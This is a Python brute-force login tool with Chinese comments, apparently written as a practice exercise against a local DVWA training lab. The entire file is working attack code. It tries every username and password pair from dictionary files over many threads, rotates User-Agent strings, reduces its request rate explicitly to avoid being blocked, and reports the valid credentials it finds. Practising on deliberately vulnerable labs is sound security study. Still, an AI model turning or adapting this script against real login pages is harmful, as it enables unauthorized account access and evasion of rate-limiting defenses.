import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import requests

UA_pool = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]


class Brute:
    def __init__(self, url, base_params, pass_path, name=None, name_path=None, workers=10, timeout=5):
        self.url = url
        self.params = base_params
        self.name = name
        self.name_path = name_path
        self.pass_path = pass_path
        self.name_list = []
        self.pass_list = []
        self.lock = threading.Lock()
        self.max_workers = workers
        self.timeout = timeout
        self.founds = set()
        self.completed = 0
        self.total = 0

    def load_dict(self, path):
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                out_list = [line.strip() for line in f if line.strip()]
                return out_list
        except FileNotFoundError:
            print(f'[!!!] 文件不存在: {path}')
            return None
        except Exception as e:
            print(f'[!!!] 文件加载失败: {str(e)}')
            return None

    def send_request(self, data):
        """发送单个请求 - 修复：返回完整的response对象"""
        headers = {'User-Agent': random.choice(UA_pool)}
        try:
            # DVWA使用GET请求，参数在URL中，还需要Login参数
            params = data.copy()
            params['Login'] = 'Login'  # 添加必需的Login参数

            response = requests.get(
                self.url,
                params=params,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=False
            )
            return response, data
        except Exception as e:
            print(f'[-] 请求失败: {data} - {str(e)}')
            return None, data

    def handle_response(self, response, data):
        """针对DVWA的成功判断逻辑"""
        if not response:
            return False

        # 调试：打印响应信息（可选）
        # print(f"测试: {data['username']}:{data['password']} -> 状态码: {response.status_code}")
        # print(f"响应长度: {len(response.text)}")

        # DVWA特定的成功条件
        response_text = response.text.lower()

        # 成功指标
        success_indicators = [
            'welcome to the password protected area' in response_text,  # 最重要的指标
            'successfully logged in' in response_text,
            'login successful' in response_text,
        ]

        # 失败指标
        failure_indicators = [
            'login failed' in response_text,
            'username and/or password incorrect' in response_text,
            'incorrect' in response_text and 'password' in response_text,
        ]

        # 如果有成功指标且没有失败指标，认为成功
        success = any(success_indicators) and not any(failure_indicators)

        # 如果是成功的响应，打印详细信息
        if success:
            print(f"[+] 成功响应特征:")
            print(f"    状态码: {response.status_code}")
            print(f"    响应长度: {len(response.text)}")
            for indicator in success_indicators:
                if indicator in response_text:
                    print(f"    匹配成功指标: {indicator}")

        return success

    def data_generator(self):
        """生成用户名密码组合"""
        for name in self.name_list:
            for passwd in self.pass_list:
                yield {
                    self.params[0]: name,
                    self.params[1]: passwd
                }

    def brute(self):
        """执行爆破"""
        self.total = len(self.name_list) * len(self.pass_list)
        start_time = time.time()

        print(f'[+] 开始爆破，共 {self.total} 种组合，线程数: {self.max_workers}')
        print(f'[+] 目标URL: {self.url}')

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # 提交所有任务
            future_to_data = {
                executor.submit(self.send_request, data): data
                for data in self.data_generator()
            }

            # 处理完成的任务
            for future in as_completed(future_to_data):
                self.completed += 1
                response, data = future.result()

                # 显示进度
                if self.completed % 10 == 0 or self.completed == self.total:
                    elapsed = time.time() - start_time
                    speed = self.completed / elapsed if elapsed > 0 else 0
                    remaining = (self.total - self.completed) / speed if speed > 0 else 0
                    print(f'进度: {self.completed}/{self.total} | 速度: {speed:.1f}次/秒 | 剩余: {remaining:.1f}秒')

                # 检查是否成功
                if response and self.handle_response(response, data):
                    with self.lock:
                        username = data[self.params[0]]
                        password = data[self.params[1]]
                        self.founds.add((username, password))
                        print(f'[***] 爆破成功! 用户名: {username}, 密码: {password}')
                        # 可以在这里添加break来提前结束

    def run_brute(self):
        """运行爆破"""
        # 加载用户名
        if self.name:
            self.name_list = [self.name]
            print(f'[+] 使用已知用户名: {self.name}')
        else:
            self.name_list = self.load_dict(self.name_path)
            if not self.name_list:
                print('[-] 用户名字典加载失败')
                return
            print(f'[+] 加载用户名字典: {len(self.name_list)} 个用户名')

        # 加载密码
        self.pass_list = self.load_dict(self.pass_path)
        if not self.pass_list:
            print('[-] 密码字典加载失败')
            return
        print(f'[+] 加载密码字典: {len(self.pass_list)} 个密码')
        print(f'[+] 密码列表前5个: {self.pass_list[:5]}')  # 调试：查看密码字典内容

        # 开始爆破
        self.brute()

        # 输出结果
        if self.founds:
            print(f'\n[+] 爆破完成！找到 {len(self.founds)} 个有效凭证:')
            for username, password in self.founds:
                print(f'    {username}:{password}')
        else:
            print('[-] 未找到有效凭证')
            print('[-] 可能的原因:')
            print('    1. 密码字典中不包含正确密码')
            print('    2. DVWA安全等级设置过高')
            print('    3. 需要先登录DVWA获取session')
            print('    4. 网络连接问题')


if __name__ == '__main__':
    # DVWA 暴力破解 - 根据你的截图调整
    url = 'http://127.0.0.1/dvwa/vulnerabilities/brute/'
    base_params = ['username', 'password']
    pass_path = 'password.txt'  # 确保这个文件包含'password'

    brute_force = Brute(
        url=url,
        base_params=base_params,
        pass_path=pass_path,
        name_path='username.txt',  # 从截图看用户名是admin
        workers=3,  # 降低线程数避免被封
        timeout=5
    )
    brute_force.run_brute()